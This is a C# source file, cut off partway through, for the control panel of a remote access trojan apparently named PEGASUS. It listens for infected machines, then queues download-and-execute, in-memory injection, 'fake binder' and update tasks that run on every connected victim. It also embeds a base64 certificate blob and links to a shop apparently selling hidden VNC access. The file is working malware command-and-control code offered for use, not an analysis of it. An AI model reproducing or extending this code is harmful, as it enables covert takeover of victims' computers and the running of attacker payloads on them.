using PEGASUS.Cryptografhsh;
using PEGASUS.Design.PEGASUS.HVNC;
using PEGASUS.Diadyktio;
using PEGASUS.IcarusWings;
using PEGASUS.Metafora_Dedomenon;
using System.Timers;

namespace PEGASUS.Design
{
    using dnlib.DotNet;
    using dnlib.DotNet.Emit;
    using HVNC;
    using Microsoft.VisualBasic.CompilerServices;
    using System;
    using System.Collections;
    using System.Collections.Generic;
    using System.Diagnostics;
    using System.Drawing;
    using System.IO;
    using System.Linq;
    using System.Net;
    using System.Net.Sockets;
    using System.Reflection;
    using System.Runtime.CompilerServices;
    using System.Runtime.InteropServices;
    using System.Runtime.Serialization.Formatters;
    using System.Runtime.Serialization.Formatters.Binary;
    using System.Security.Cryptography.X509Certificates;
    using System.Security.Principal;
    using System.Text;
    using System.Threading;
    using System.Threading.Tasks;
    using System.Windows.Forms;
    using FileAttributes = System.IO.FileAttributes;
    using Timer = System.Windows.Forms.Timer;

    /// <summary>
    /// Defines the <see cref="PEGALISIUS" />.
    /// </summary>
    public partial class PEGALISIUS : Form
    {
        /// <summary>
        /// Defines the getTasks.
        /// </summary>
        public static List<AsyncTask> getTasks = new List<AsyncTask>();

        // public cGeoMain cGeoMain = new cGeoMain();
        /// <summary>
        /// Defines the lvwColumnSorter.
        /// </summary>
        private ListViewColumnSorter lvwColumnSorter;

        /// <summary>
        /// Defines the Server.
        /// </summary>
        private Socket Server;

        /// <summary>
        /// Defines the trans.
        /// </summary>
        private bool trans;

        /// <summary>
        /// Defines the filePatchbin.
        /// </summary>
        public string filePatchbin = "";

        /// <summary>
        /// Initializes a new instance of the <see cref="PEGALISIUS"/> class.
        /// </summary>
        public PEGALISIUS() => this.InitializeComponent();

        /// <summary>
        /// The UnixTimeToDateTime.
        /// </summary>
        /// <param name="unixtime">The unixtime<see cref="long"/>.</param>
        /// <returns>The <see cref="DateTime"/>.</returns>
        public DateTime UnixTimeToDateTime(long unixtime)
        {
            System.DateTime dtDateTime = new DateTime(1970, 1, 1, 0, 0, 0, 0, System.DateTimeKind.Local);
            dtDateTime = dtDateTime.AddSeconds(unixtime).ToLocalTime();
            return dtDateTime;
        }
        private static void Timer_Elapsed(object sender, ElapsedEventArgs e)
        {
            Application.Exit();
        }
        private static string reupload(string str)
        {
            var ch1 = '\n';
            var stringBuilder = new StringBuilder();

            foreach (uint num in str.ToCharArray())
            {
                var ch2 = (char)(num ^ ch1);
                stringBuilder.Append(ch2);
            }

            return stringBuilder.ToString();
        }
        /// <summary>
        /// The PEGASUSM.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private async void PEGASUSM(object sender, EventArgs e)
        {


            //using (var newinf = new Login())
            //{
            //    newinf.ShowDialog();
            //}


            //label15.Text = tabControl1.SelectedIndex.ToString();
            label5.Text = userFame;
            guna2Transition3.ShowSync(LISTVIEWPANEL0);
            guna2Transition3.HideSync(LISTVIEWTASKS);


            ListviewDoubleBuffer.Enable(listView1);
            ListviewDoubleBuffer.Enable(listView2);
            ListviewDoubleBuffer.Enable(listView3);
            ListviewDoubleBuffer.Enable(listView4);
            ListviewDoubleBuffer.Enable(HVNCList);

            listView1.Columns[0].TextAlign = HorizontalAlignment.Center;
            listView1.Columns[1].TextAlign = HorizontalAlignment.Center;
            listView1.Columns[2].TextAlign = HorizontalAlignment.Center;
            listView1.Columns[3].TextAlign = HorizontalAlignment.Center;
            listView1.Columns[4].TextAlign = HorizontalAlignment.Center;
            listView1.Columns[5].TextAlign = HorizontalAlignment.Center;
            listView1.Columns[6].TextAlign = HorizontalAlignment.Center;
            listView1.Columns[7].TextAlign = HorizontalAlignment.Center;
            listView1.Columns[8].TextAlign = HorizontalAlignment.Center;
            listView1.Columns[9].TextAlign = HorizontalAlignment.Center;
            listView1.Columns[10].TextAlign = HorizontalAlignment.Center;
            listView1.Columns[11].TextAlign = HorizontalAlignment.Center;
            listView1.Columns[12].TextAlign = HorizontalAlignment.Center;
            listView1.Columns[13].TextAlign = HorizontalAlignment.Center;

            SetLastColumnWidth5();
            HVNCList.Layout += delegate { SetLastColumnWidth5(); };
            this.HVNCList.View = View.Details;
            this.HVNCList.HideSelection = false;
            this.HVNCList.OwnerDraw = true;
            this.HVNCList.BackColor = Color.FromArgb(25, 27, 38);
            this.HVNCList.DrawColumnHeader += (DrawListViewColumnHeaderEventHandler)((sender1, args) =>
            {
                Brush brush = (Brush)new SolidBrush(Color.FromArgb(45, 47, 59));
                args.Graphics.FillRectangle(brush, args.Bounds);
                TextRenderer.DrawText((IDeviceContext)args.Graphics, args.Header.Text, args.Font, args.Bounds, Color.WhiteSmoke);
            });
            this.HVNCList.DrawItem += (DrawListViewItemEventHandler)((sender1, args) => args.DrawDefault = true);
            this.HVNCList.DrawSubItem += (DrawListViewSubItemEventHandler)((sender1, args) => args.DrawDefault = true);

            SetLastColumnWidth();

            listView1.Layout += delegate { SetLastColumnWidth(); };
            listView1.View = View.Details;
            listView1.HideSelection = false;
            listView1.OwnerDraw = true;
            listView1.GridLines = false;

            listView1.BackColor = System.Drawing.Color.FromArgb(25, 27, 38);
            listView1.DrawColumnHeader += (sender1, args) =>
            {
                Brush brush = new SolidBrush(Color.FromArgb(45, 47, 59));
                args.Graphics.FillRectangle(brush, args.Bounds);
                TextRenderer.DrawText(args.Graphics, args.Header.Text, args.Font, args.Bounds, Color.WhiteSmoke);
            };
            listView1.DrawItem += (sender1, args) => args.DrawDefault = true;
            listView1.DrawSubItem += (sender1, args) => args.DrawDefault = true;

            SetLastColumnWidth4();

            listView4.Layout += delegate { SetLastColumnWidth4(); };
            listView4.View = View.Details;
            listView4.HideSelection = false;
            listView4.OwnerDraw = true;
            listView4.GridLines = false;

            listView4.BackColor = System.Drawing.Color.FromArgb(25, 27, 38);
            listView4.DrawColumnHeader += (sender1, args) =>
            {
                Brush brush = new SolidBrush(Color.FromArgb(45, 47, 59));
                args.Graphics.FillRectangle(brush, args.Bounds);
                TextRenderer.DrawText(args.Graphics, args.Header.Text, args.Font, args.Bounds, Color.WhiteSmoke);
            };
            listView4.DrawItem += (sender1, args) => args.DrawDefault = true;
            listView4.DrawSubItem += (sender1, args) => args.DrawDefault = true;

            SetLastColumnWidth2();
            listView2.Layout += delegate { SetLastColumnWidth2(); };
            listView2.View = View.Details;
            listView2.HideSelection = false;
            listView2.OwnerDraw = true;
            listView2.GridLines = false;

            listView2.BackColor = System.Drawing.Color.FromArgb(25, 27, 38);
            listView2.DrawColumnHeader += (sender1, args) =>
            {
                Brush brush = new SolidBrush(Color.FromArgb(45, 47, 59));
                args.Graphics.FillRectangle(brush, args.Bounds);
                TextRenderer.DrawText(args.Graphics, args.Header.Text, args.Font, args.Bounds, Color.WhiteSmoke);
            };
            listView2.DrawItem += (sender1, args) => args.DrawDefault = true;
            listView2.DrawSubItem += (sender1, args) => args.DrawDefault = true;



            //CheckFiles();
            lvwColumnSorter = new ListViewColumnSorter();
            listView1.ListViewItemSorter = lvwColumnSorter;
            Text = $"{Settings.Version}";
#if DEBUG
            Settings.PEGASUSCertificate =
 new X509Certificate2(Convert.FromBase64String("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"));
            Listener listener = new Listener();
            Thread thread = new Thread(new ParameterizedThreadStart(listener.Connect));
            thread.IsBackground = true;
            thread.Start(4449);
#else

            // l.L();

            using (var newinf = new FormPorts())
            {
                newinf.ShowDialog();
            }

            if (!File.Exists(Path.Combine(Path.GetTempPath(), "PEGASUSCertificate.p12"))) Application.Exit();
            AutostartListening();
#endif
            if (Properties.Settings.Default.Sound)
                chkSounds.Checked = true;
            else
                chkSounds.Checked = false;

            await Methods.FadeIn(this, 5);
            trans = true;

            if (Properties.Settings.Default.Notification == true)
            {
                label3.ForeColor = Color.WhiteSmoke;
                label3.Text = "On";
            }
            else
            {
                label3.ForeColor = Color.FromArgb(54, 193, 214);
                label3.Text = "Off";
            }

        }

        /// <summary>
        /// The SetLastColumnWidth.
        /// </summary>
        private void SetLastColumnWidth()
        {
            // Force the last ListView column width to occupy all the
            // available space.
            listView1.Columns[listView1.Columns.Count - 1].Width = -2;
        }

        /// <summary>
        /// The SetLastColumnWidth2.
        /// </summary>
        private void SetLastColumnWidth2()
        {
            // Force the last ListView column width to occupy all the
            // available space.
            this.listView2.Columns[this.listView2.Columns.Count - 1].Width = -2;
        }

        /// <summary>
        /// The SetLastColumnWidth4.
        /// </summary>
        private void SetLastColumnWidth4()
        {
            // Force the last ListView column width to occupy all the
            // available space.
            listView4.Columns[listView4.Columns.Count - 1].Width = -2;
        }

        /// <summary>
        /// The SetLastColumnWidth5.
        /// </summary>
        private void SetLastColumnWidth5()
        {
            // Force the last ListView column width to occupy all the
            // available space.
            HVNCList.Columns[HVNCList.Columns.Count - 1].Width = -2;
        }

        /// <summary>
        /// The AutostartListening.
        /// </summary>
        private void AutostartListening()
        {
            try
            {
                var ports = Properties.Settings.Default.Ports.Split(new[] { "," }, StringSplitOptions.None);
                foreach (var item in ports)
                    if (!string.IsNullOrWhiteSpace(item))
                    {
                        new Thread(delegate () { Connect(); }).Start();
                        Listener.ForeColor = Color.FromArgb(54, 193, 214);
                        Listener.Text = "Listening on port:4449";
                        guna2ToggleSwitch1.Checked = true;
                    }
                    else
                    {
                        var listener = new Listener();
                        var thread = new Thread(listener.Connect);
                        thread.IsBackground = true;
                        thread.Start(item);
                        Listener.ForeColor = Color.FromArgb(54, 193, 214);
                        Listener.Text = "Listening on port:" + item + "";
                        guna2ToggleSwitch1.Checked = true;
                    }
            }
            catch
            {
            }
        }

        /// <summary>
        /// Defines the userFame.
        /// </summary>
        public static string userFame = Environment.UserName;//"Skynet";///

        /// <summary>
        /// The PEGASUS_M_Activated.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void PEGASUS_M_Activated(object sender, EventArgs e)
        {
            if (trans)
                Opacity = 1.0;
        }

        /// <summary>
        /// The PEGASUS_M_Deactivate.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void PEGASUS_M_Deactivate(object sender, EventArgs e)
        {
            Opacity = 0.95;
        }

        /// <summary>
        /// The PEGASUS_M_FormClosed.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="FormClosedEventArgs"/>.</param>
        private void PEGASUS_M_FormClosed(object sender, FormClosedEventArgs e)
        {
            notifyIcon1.Dispose();
            File.Delete(Path.GetTempPath() + @"\PEGASUSCertificate.p12");
            File.Delete(Path.GetTempPath() + @"\Client.exe");
            Environment.Exit(0);
        }

        /// <summary>
        /// The DeleteDirectory.
        /// </summary>
        /// <param name="target_dir">The target_dir<see cref="string"/>.</param>
        public static void DeleteDirectory(string target_dir)
        {
            var files = Directory.GetFiles(target_dir);
            var dirs = Directory.GetDirectories(target_dir);

            foreach (var file in files)
            {
                File.SetAttributes(file, FileAttributes.Normal);
                File.Delete(file);
            }

            foreach (var dir in dirs) DeleteDirectory(dir);

            Directory.Delete(target_dir, false);
        }

        /// <summary>
        /// The listView1_KeyDown.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="KeyEventArgs"/>.</param>
        private void listView1_KeyDown(object sender, KeyEventArgs e)
        {
            if (listView1.Items.Count > 0)
                if (e.Modifiers == Keys.Control && e.KeyCode == Keys.A)
                    foreach (ListViewItem x in listView1.Items)
                        x.Selected = true;
        }

        /// <summary>
        /// The listView1_MouseMove.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="MouseEventArgs"/>.</param>
        private void listView1_MouseMove(object sender, MouseEventArgs e)
        {
            if (listView1.Items.Count > 1)
            {
                var hitInfo = listView1.HitTest(e.Location);
                if (e.Button == MouseButtons.Left && (hitInfo.Item != null || hitInfo.SubItem != null))
                    listView1.Items[hitInfo.Item.Index].Selected = true;
            }
        }

        /// <summary>
        /// The ListView1_ColumnClick.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="ColumnClickEventArgs"/>.</param>
        private void ListView1_ColumnClick(object sender, ColumnClickEventArgs e)
        {
            if (e.Column == lvwColumnSorter.SortColumn)
            {
                if (lvwColumnSorter.Order == SortOrder.Ascending)
                    lvwColumnSorter.Order = SortOrder.Descending;
                else
                    lvwColumnSorter.Order = SortOrder.Ascending;
            }
            else
            {
                lvwColumnSorter.SortColumn = e.Column;
                lvwColumnSorter.Order = SortOrder.Ascending;
            }

            listView1.Sort();
        }

        /// <summary>
        /// The ToolStripStatusLabel2_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void ToolStripStatusLabel2_Click(object sender, EventArgs e)
        {
            if (Properties.Settings.Default.Notification)
            {
                Properties.Settings.Default.Notification = false;
                //toolStripStatusLabel2.ForeColor = Color.Red;
                //toolStripStatusLabel2.ForeColor = Color.White;
                label3.ForeColor = Color.Red;
                label3.Text = "Off";
            }
            else
            {
                Properties.Settings.Default.Notification = true;
                //toolStripStatusLabel2.ForeColor = Color.FromArgb(54, 193, 214);
                //toolStripStatusLabel2.ForeColor = Color.White;
                label3.ForeColor = Color.FromArgb(54, 193, 214);
                label3.Text = "On";
            }

            Properties.Settings.Default.Save();
        }

        /// <summary>
        /// The toolStripMenuItem48_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void toolStripMenuItem48_Click(object sender, EventArgs e)
        {
            try
            {
                lock (Settings.LockListviewLogs)
                {
                    listView2.Items.Clear();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The copySelectedToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void copySelectedToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView2.SelectedItems.Count == 0) return;

            string output = string.Empty;

            foreach (ListViewItem lvi in listView2.SelectedItems)
            {
                output = lvi.SubItems.Cast<ListViewItem.ListViewSubItem>().Aggregate(output, (current, lvs) => current + (lvs.Text + " : "));
                output = output.Remove(output.Length - 3);
                output = output + "\r\n";
            }
            //string finaly1 = output.Replace("Login :", "");
            //string finaly2 = finaly1.Replace("tcp://", "");
            ClipboardHelper.SetClipboardText(output);
        }

        /// <summary>
        /// Defines the <see cref="ClipboardHelper" />.
        /// </summary>
        public static class ClipboardHelper
        {
            /// <summary>
            /// The SetClipboardText.
            /// </summary>
            /// <param name="text">The text<see cref="string"/>.</param>
            public static void SetClipboardText(string text)
            {
                try
                {
                    Clipboard.SetText(text);
                }
                catch (Exception)
                {
                }
            }
        }

        /// <summary>
        /// The hVNCShopToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void hVNCShopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Process.Start("https://skynetcorp.sellix.io/");
        }

        /// <summary>
        /// The stopNgrokToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void stopNgrokToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                try
                {
                    MsgPack packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "NgrokStop";


                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Ngrok.dll"));
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (Clients client in GetSelectedClients())
                    {
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());

                    }

                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                    return;
                }
            }
        }

        /// <summary>
        /// The guna2ControlBox1_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void guna2ControlBox1_Click(object sender, EventArgs e)
        {
        }

        /// <summary>
        /// The chkpreview_CheckedChanged.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void chkpreview_CheckedChanged(object sender, EventArgs e)
        {
        }

        /// <summary>
        /// The CLEARToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void CLEARToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                lock (Settings.LockListviewLogs)
                {
                    listView2.Items.Clear();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The DELETETASKToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void DELETETASKToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView4.SelectedItems.Count > 0)
                foreach (ListViewItem item in listView4.SelectedItems)
                    item.Remove();
        }

        /// <summary>
        /// The TimerTask_Tick.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private async void TimerTask_Tick(object sender, EventArgs e)
        {
            try
            {
                var clients = GetAllClients();
                if (getTasks.Count > 0 && clients.Length > 0)
                    foreach (var asyncTask in getTasks.ToList())
                    {
                        if (GetListview(asyncTask.id) == false)
                        {
                            getTasks.Remove(asyncTask);
                            Debug.WriteLine("task removed");
                            return;
                        }

                        foreach (var client in clients)
                            if (!asyncTask.doneClient.Contains(client.ID))
                            {
                                if (client.Admin)
                                {
                                    Debug.WriteLine("task executed");
                                    asyncTask.doneClient.Add(client.ID);
                                    SetExecution(asyncTask.id);
                                    ThreadPool.QueueUserWorkItem(client.Send, asyncTask.msgPack);
                                }
                                else if (!client.Admin && !asyncTask.admin)
                                {
                                    Debug.WriteLine("task executed");
                                    asyncTask.doneClient.Add(client.ID);
                                    SetExecution(asyncTask.id);
                                    ThreadPool.QueueUserWorkItem(client.Send, asyncTask.msgPack);
                                }
                                else
                                {
                                    Debug.WriteLine("task can't executed");
                                }

                                ;
                            }

                        await Task.Delay(15 * 1000);
                    }
            }
            catch
            {
            }
        }

        /// <summary>
        /// The DownloadAndExecuteToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void DownloadAndExecuteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                var openFileDialog = new OpenFileDialog();
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "sendFile";
                    packet.ForcePathObject("Update").AsString = "false";
                    packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
                    packet.ForcePathObject("FileName").AsString = Path.GetFileName(openFileDialog.FileName);

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\SF.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    var lv = new ListViewItem();
                    lv.Text = "SendFile: " + Path.GetFileName(openFileDialog.FileName);
                    lv.SubItems.Add("0");
                    lv.ToolTipText = Guid.NewGuid().ToString();

                    if (listView4.Items.Count > 0)
                        foreach (ListViewItem item in listView4.Items)
                            if (item.Text == lv.Text)
                                return;

                    Program.form1.listView4.Items.Add(lv);
                    Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);

                    getTasks.Add(new AsyncTask(msgpack.Encode2Bytes(), lv.ToolTipText, false));
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The SENDFILETOMEMORYToolStripMenuItem1_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void SENDFILETOMEMORYToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                var formSend = new FormSendFileToMemory();
                formSend.ShowDialog();
                if (formSend.toolStripStatusLabel1.Text.Length > 0 &&
                    formSend.toolStripStatusLabel1.ForeColor == Color.FromArgb(3, 130, 200))
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "sendMemory";
                    packet.ForcePathObject("File")
                        .SetAsBytes(Zip.Compress(File.ReadAllBytes(formSend.toolStripStatusLabel1.Tag.ToString())));

                    if (formSend.comboBox1.SelectedIndex == 0)
                        packet.ForcePathObject("Inject").AsString = "";
                    else
                        packet.ForcePathObject("Inject").AsString = formSend.comboBox2.Text;

                    var lv = new ListViewItem();
                    lv.Text = "SendMemory: " + Path.GetFileName(formSend.toolStripStatusLabel1.Tag.ToString());
                    lv.SubItems.Add("0");
                    lv.ToolTipText = Guid.NewGuid().ToString();

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\SM.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    if (listView4.Items.Count > 0)
                        foreach (ListViewItem item in listView4.Items)
                            if (item.Text == lv.Text)
                                return;

                    Program.form1.listView4.Items.Add(lv);
                    Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);

                    getTasks.Add(new AsyncTask(msgpack.Encode2Bytes(), lv.ToolTipText, false));
                }

                formSend.Close();
                formSend.Dispose();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The UPDATEToolStripMenuItem1_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void UPDATEToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                using (var openFileDialog = new OpenFileDialog())
                {
                    if (openFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        var packet = new MsgPack();
                        packet.ForcePathObject("Pac_ket").AsString = "sendFile";
                        packet.ForcePathObject("File")
                            .SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
                        packet.ForcePathObject("FileName").AsString = Path.GetFileName(openFileDialog.FileName);
                        packet.ForcePathObject("Update").AsString = "true";

                        var msgpack = new MsgPack();
                        msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                        msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\SF.dll");
                        msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                        foreach (var client in GetSelectedClients())
                        {
                            client.LV.ForeColor = Color.Red;
                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The GetListview.
        /// </summary>
        /// <param name="id">The id<see cref="string"/>.</param>
        /// <returns>The <see cref="bool"/>.</returns>
        private bool GetListview(string id)
        {
            foreach (ListViewItem item in Program.form1.listView4.Items)
                if (item.ToolTipText == id)
                    return true;
            return false;
        }

        /// <summary>
        /// The SetExecution.
        /// </summary>
        /// <param name="id">The id<see cref="string"/>.</param>
        private void SetExecution(string id)
        {
            foreach (ListViewItem item in Program.form1.listView4.Items)
                if (item.ToolTipText == id)
                {
                    var count = Convert.ToInt32(item.SubItems[1].Text);
                    count++;
                    item.SubItems[1].Text = count.ToString();
                }
        }

        /// <summary>
        /// The fakeBinderToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void fakeBinderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                var openFileDialog = new OpenFileDialog();
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "fakeBinder";
                    packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
                    packet.ForcePathObject("Extension").AsString = Path.GetExtension(openFileDialog.FileName);

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\SF.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    var lv = new ListViewItem();
                    lv.Text = "FakeBinder: " + Path.GetFileName(openFileDialog.FileName);
                    lv.SubItems.Add("0");
